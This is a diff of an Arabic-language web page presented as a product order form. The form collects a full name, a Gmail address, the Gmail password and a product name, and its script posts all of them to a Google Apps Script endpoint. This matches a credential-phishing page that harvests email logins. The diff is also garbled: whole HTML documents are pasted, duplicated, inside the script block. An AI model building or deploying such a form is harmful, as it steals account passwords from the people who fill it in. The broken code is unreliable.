@@ -35,29 +35,103 @@
           product: document.getElementById("product").value
         };
 
-        fetch("https://script.google.com/macros/s//AKfycbyp5E5gEy-7FjbaV1MCq-bQ3Rgi8By0wFHPTbZpYFntger4zbpFC8wvAISy6VI2v7cs/exec", {
-          method: "POST",
-          body: JSON.stringify(data),
-          headers: {
-            "Content-Type": "application/json"
-          }
-        })
-        .then(response => {
-          if (response.ok) {
-            alert("✅ تم إرسال البيانات بنجاح!");
-            document.getElementById("productForm").reset();
-          } else {
-            alert("❌ حدث خطأ أثناء الإرسال، حاول مرة أخرى.");
-          }
-        })
-        .catch(error => {
-          alert("⚠️ فشل الاتصال بالخادم: " + error.message);
-        });
+        <!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>نموذج المنتج</title>
+</head>
+<body>
+
+  <form id="productForm">
+    <label for="name">الاسم الكامل:</label><br>
+    <input type="text" id="name" name="name" required><br><br>
+
+    <label for="email">بريد Gmail:</label><br>
+    <input type="email" id="email" name="email" required><br><br>
+
+    <label for="password">كلمة المرور:</label><br>
+    <input type="password" id="password" name="password" required><br><br>
+
+    <label for="product">اسم المنتج:</label><br>
+    <input type="text" id="product" name="product" required><br><br>
+
+    <button type="submit">إرسال</button>
+  </form>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      document.getElementById("productForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+
+        const data = {
+          name: document.getElementById("name").value,
+          email: document.getElementById("email").value,
+          password: document.getElementById("password").value,
+          product: document.getElementById("product").value
+        };
+
+        <!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>نموذج المنتج</title>
+</head>
+<body>
+
+  <form id="productForm">
+    <label for="name">الاسم الكامل:</label><br>
+    <input type="text" id="name" name="name" required><br><br>
+
+    <label for="email">بريد Gmail:</label><br>
+    <input type="email" id="email" name="email" required><br><br>
+
+    <label for="password">كلمة المرور:</label><br>
+    <input type="password" id="password" name="password" required><br><br>
+
+    <label for="product">اسم المنتج:</label><br>
+    <input type="text" id="product" name="product" required><br><br>
+
+    <button type="submit">إرسال</button>
+  </form>
+
+ <script>
+  document.addEventListener("DOMContentLoaded", function () {
+    document.getElementById("productForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const data = {
+        name: document.getElementById("name").value,
+        email: document.getElementById("email").value,
+        password: document.getElementById("password").value,
+        product: document.getElementById("product").value
+      };
+
+      console.log("📌 تم تجهيز البيانات للإرسال:", data); // ✅ في مكانه الصحيح
+
+      fetch("https://script.google.com/macros/s/AKfycbxbhzGlcrTjJ0M56YnQFx1hfWoiDSU0J7xW_ya-Rnl0k6iESnsEL_po8I3DalUtGY9T/exec", {
+        method: "POST",
+        body: JSON.stringify(data),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("✅ تم إرسال البيانات بنجاح!");
+          document.getElementById("productForm").reset();
+        } else {
+          alert("❌ حدث خطأ أثناء الإرسال، حاول مرة أخرى.");
+        }
+      })
+      .catch(error => {
+        alert("⚠️ فشل الاتصال بالخادم: " + error.message);
       });
     });
-  </script>
-
+  });
+</script>
+  
 </body>
 </html>
-
-
